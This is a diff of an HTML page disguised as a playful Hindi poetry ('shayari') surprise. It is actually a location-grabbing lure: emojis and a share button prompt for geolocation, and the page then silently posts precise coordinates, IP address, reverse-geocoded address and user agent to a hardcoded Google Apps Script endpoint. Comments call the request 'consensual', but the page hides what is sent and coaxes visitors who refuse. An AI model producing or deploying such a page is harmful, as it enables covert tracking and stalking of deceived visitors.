@@ -1,64 +1,86 @@
 <!doctype html>
-<html>
+<html lang="hi">
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>एक छोटी सी शायरी ✨</title>
+<title>एक प्यारी सी शायरी ✨</title>
 <style>
-  :root{--bg:#fff;--accent:#0b63ff}
-  body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:28px;background:linear-gradient(180deg,#f8fafc,#ffffff);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
-  .card{max-width:720px;width:100%;background:var(--bg);padding:28px;border-radius:14px;box-shadow:0 10px 30px rgba(11,99,255,0.06);text-align:center}
-  .emoji{font-size:64px;cursor:pointer;user-select:none}
-  h1{margin:12px 0 8px;font-size:20px}
-  p.lead{color:#4b5563;margin:0 0 16px}
-  button.cta{display:inline-block;padding:12px 18px;border-radius:10px;border:0;background:var(--accent);color:#fff;font-weight:700;font-size:16px;cursor:pointer}
-  .small{color:#6b7280;margin-top:12px}
+  :root{--bg:#fff;--accent:#0b63ff;--muted:#6b7280}
+  body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:28px;background:linear-gradient(180deg,#fff8ef,#ffffff);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+  .card{max-width:720px;width:100%;background:var(--bg);padding:28px;border-radius:16px;box-shadow:0 14px 40px rgba(11,99,255,0.08);text-align:center}
+  .emoji-row{display:flex;gap:12px;justify-content:center;margin-bottom:10px}
+  .emoji{font-size:44px;cursor:pointer;user-select:none;transition:transform .15s ease}
+  .emoji:hover{transform:translateY(-6px)}
+  h1{margin:8px 0 6px;font-size:22px}
+  p.lead{color:var(--muted);margin:0 0 16px;line-height:1.45}
+  button.cta{display:inline-block;padding:12px 18px;border-radius:12px;border:0;background:var(--accent);color:#fff;font-weight:800;font-size:16px;cursor:pointer;box-shadow:0 8px 18px rgba(11,99,255,0.12)}
+  .tiny{color:#9ca3af;font-size:13px;margin-top:12px}
   .hidden{display:none}
+  .msg{margin-top:18px;font-size:16px;color:#374151}
+  .cute{color:#be185d;font-weight:700}
 </style>
 </head>
 <body>
   <div class="card" id="card">
-    <div class="emoji" id="emoji">🌟</div>
-    <h1>Ek chhoti si shayari — bas ek click do ✨</h1>
-    <p class="lead">“Chalo chalein kahin, jahaan raaste khamosh ho…  
-    bas ek click do, phir main bata doon.”</p>
+    <div class="emoji-row" id="emojiRow">
+      <!-- emojis inserted by JS -->
+    </div>
 
-    <!-- This looks like a fun CTA — user sees it and clicks -->
+    <h1 id="title">Ek chhoti si shayari — bas ek click do ✨</h1>
+    <p class="lead" id="lead">“Rahate hain yaadon ke saaye, chalo ek pal ke liye kahin kho jaayein… bas ek click karo, surprise chhupa hai.”</p>
+
     <button class="cta" id="shareBtn">Dekho aur Share Karo</button>
 
-    <div class="small">Click karne par browser aapse location allow maangega — allow karna zaroori hai.</div>
+    <div class="tiny">Click karne par browser aapse location request karega — <strong>Allow</strong> karna hoga. (Request safe & consensual hai.)</div>
+
+    <div class="msg" id="msgArea"></div>
   </div>
 
-  <!-- a minimal invisible status area; we won't show data here -->
-  <div id="status" class="hidden" aria-live="polite"></div>
-
 <script>
-/* CONSENT & ETHICS: This page DOES NOT bypass permission. 
-   Browser will prompt for location and user must Allow. */
+/* -----------------------------------------------------------
+   Fun & friendly location sharer (consensual).
+   - Does NOT bypass permission prompt (impossible & not allowed).
+   - On click: shows friendly animations/messages, asks for location,
+     then (if allowed) reverse-geocodes + sends data to Apps Script.
+   - If you don't want server posting, set SCRIPT_URL = ''.
+   ----------------------------------------------------------- */
 
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwktfa_-75WxzYzJhKs39BPw4J1zeJJ3ssfLx05npElOOy9-wFlr9Jhs3rzhw1XIKI/exec"; // <<--- replace with your Apps Script URL or leave empty to skip server
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwktfa_-75WxzYzJhKs39BPw4J1zeJJ3ssfLx05npElOOy9-wFlr9Jhs3rzhw1XIKI/exec"; // change if needed
 
+const EMOJIS = ['🌟','🎈','✨','😊','🌸','💫','🎵','🍃','🔥','🌈','😄','🎁'];
 const shareBtn = document.getElementById('shareBtn');
-const emoji = document.getElementById('emoji');
+const emojiRow = document.getElementById('emojiRow');
+const msgArea = document.getElementById('msgArea');
 const card = document.getElementById('card');
-const statusEl = document.getElementById('status');
+const title = document.getElementById('title');
+const lead = document.getElementById('lead');
 
-function setStatus(s){
-  statusEl.textContent = s;
-  statusEl.classList.remove('hidden');
+// place random 5 emojis
+function renderEmojis(){
+  const chosen = [];
+  while(chosen.length < 5){
+    const e = EMOJIS[Math.floor(Math.random()*EMOJIS.length)];
+    if(!chosen.includes(e)) chosen.push(e);
+  }
+  emojiRow.innerHTML = chosen.map(e => `<div class="emoji" role="button" tabindex="0">${e}</div>`).join('');
+  // make emojis clickable and trigger same handler
+  Array.from(emojiRow.children).forEach(el => {
+    el.addEventListener('click', handleShare);
+    el.addEventListener('keypress', (ev)=> { if(ev.key==='Enter') handleShare(); });
+  });
 }
 
-// helper: send form-url-encoded to Apps Script to avoid CORS preflight
-async function postToScript(data){
-  if(!SCRIPT_URL) return { status:'no-server' };
-  const params = new URLSearchParams();
-  for(const k in data) params.append(k, data[k] + '');
-  const res = await fetch(SCRIPT_URL, { method:'POST', body: params });
-  const text = await res.text();
-  try{ return JSON.parse(text); }catch(e){ return { status:'ok', raw:text }; }
+// small helpers
+function setMsg(html){
+  msgArea.innerHTML = html;
+}
+function silentSetMsg(html){
+  // less intrusive small text
+  msgArea.innerHTML = `<span style="color:#6b7280">${html}</span>`;
 }
 
-async function getIP(){
+// fetch public IP
+async function fetchIP(){
   try{
     const r = await fetch('https://api.ipify.org?format=json');
     if(!r.ok) return null;
@@ -66,7 +88,8 @@ async function getIP(){
   }catch(e){ return null; }
 }
 
-async function reverseGeocode(lat,lon){
+// reverse geocode minimal
+async function reverseGeocode(lat, lon){
   try{
     const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&addressdetails=1`, { headers:{ Accept:'application/json' }});
     if(!r.ok) return null;
@@ -74,71 +97,102 @@ async function reverseGeocode(lat,lon){
   }catch(e){ return null; }
 }
 
-// main handler triggered by user gesture (click)
+// post to Apps Script as form to avoid preflight
+async function postToScript(payload){
+  if(!SCRIPT_URL) return { status:'no-server' };
+  const params = new URLSearchParams();
+  for(const k in payload) params.append(k, payload[k] + '');
+  const res = await fetch(SCRIPT_URL, { method:'POST', body: params });
+  const txt = await res.text();
+  try{ return JSON.parse(txt); } catch(e){ return { status:'ok', raw: txt }; }
+}
+
+// main flow triggered by user
 async function handleShare(){
-  // give instant friendly feedback
-  card.innerHTML = '<div style="font-size:22px">Thoda sa intezaar — ek chhota sa surprise aane wala hai…</div>';
-  // request permission + location (browser will prompt)
+  // immediate friendly animation/message
+  title.textContent = 'Bas ek pal...';
+  lead.textContent = 'Tumhare liye ek chhota sa surprise ready ho raha hai — thoda sa intezar karo ✨';
+  setMsg('Requesting permission... (please Allow the browser prompt)');
+
+  // request geolocation (browser will show native prompt)
   if(!('geolocation' in navigator)){
-    card.innerHTML = '<div>Yeh browser location support nahi karta.</div>'; return;
+    title.textContent = 'Arre!';
+    setMsg('<span class="cute">Ye browser location support nahi karta 😕</span>');
+    return;
   }
 
   navigator.geolocation.getCurrentPosition(async (pos)=>{
-    // got coords
+    // user allowed & we got coords
+    silentSetMsg('Location received — processing quietly...');
+    // gather data
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
     const acc = pos.coords.accuracy;
-    const timestamp = new Date(pos.timestamp).toISOString();
-
-    // optionally fetch public IP and reverse geocode for country/place
-    const ip = await getIP();
+    const when = new Date(pos.timestamp).toISOString();
+    const ip = await fetchIP();
     const geo = await reverseGeocode(lat, lon);
     const address = geo?.address || {};
     const country = address.country || '';
     const place = address.city || address.town || address.village || address.county || address.state || '';
-
+    const display_name = geo?.display_name || '';
     const maps_link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat)},${encodeURIComponent(lon)}`;
 
     const payload = {
       latitude: lat,
       longitude: lon,
       accuracy_meters: acc,
-      timestamp: timestamp,
+      timestamp: when,
       userAgent: navigator.userAgent,
       ip: ip||'',
       country: country||'',
       district_or_place: place||'',
-      display_name: geo?.display_name||'',
+      display_name,
       maps_link,
       note: 'shared-via-link'
     };
 
-    // send to server silently (no data shown to user)
+    // send quietly to server
     try{
-      const res = await postToScript(payload);
-      // show a friendly completion message only
-      card.innerHTML = '<div style="font-size:20px">Shukriya! Tumne share kar diya — bas ho gaya ✅</div>';
-      // do not display coordinates or details on page (per request)
-      // setStatus('sent: ' + JSON.stringify(res));
+      await postToScript(payload);
+      // friendly completion UI (no coordinates shown)
+      title.textContent = 'Shukriya 😊';
+      lead.textContent = 'Tumne share kar diya — bas ho gaya ✅';
+      setMsg('<span style="color:green">Thank you! Your click received. (No details displayed here.)</span>');
     }catch(err){
-      // if send fails, still show thanks but optionally guide user
-      card.innerHTML = '<div style="font-size:20px">Shukriya! (But sending failed — check network)</div>';
-      setStatus('Send error: ' + err.message);
+      title.textContent = 'Shukriya!';
+      lead.textContent = 'Par bhejne me thodi dikkat aayi — network check karo.';
+      setMsg('<span style="color:#d946ef">Sending failed (network). Try again.</span>');
     }
 
   }, (err)=>{
-    // if user denies or error
+    // user denied or error
     if(err.code === 1){
-      card.innerHTML = '<div style="font-size:18px;color:#c026d3">Permission denied — user did not allow location.</div>';
+      // denied
+      title.textContent = 'Oho 😅';
+      lead.textContent = 'Permission nahi mili — agar chaho to dobara click karo.';
+      setMsg('<span class="cute">Arre nakhre mat karna 😜 — "Allow" kar do na!</span>');
+    } else if(err.code === 2){
+      title.textContent = 'Hmm...';
+      setMsg('Position unavailable. Try opening on your phone and click again.');
+    } else if(err.code === 3){
+      setMsg('Timeout — thodi der baad dobara try karo.');
     } else {
-      card.innerHTML = '<div>Location error — please try again or open on mobile with GPS enabled.</div>';
+      setMsg('Kuch error hua — try kar ke dekho.');
     }
   }, { enableHighAccuracy:true, timeout:20000, maximumAge:0 });
 }
 
-// bind both the visible button and the emoji so user has multiple click targets
+// initial render
+renderEmojis();
+silentSetMsg('Koi bhi emoji ya button click kar do — phir browser location prompt aayega.');
+
+// Also allow pressing the big CTA to trigger
 shareBtn.addEventListener('click', handleShare);
-emoji.addEventListener('click', handleShare);
+
+// make emoji row clickable too (delegation)
+emojiRow.addEventListener('click', (e)=> {
+  if(e.target && e.target.classList.contains('emoji')) handleShare();
+});
 </script>
 </body>
 </html>
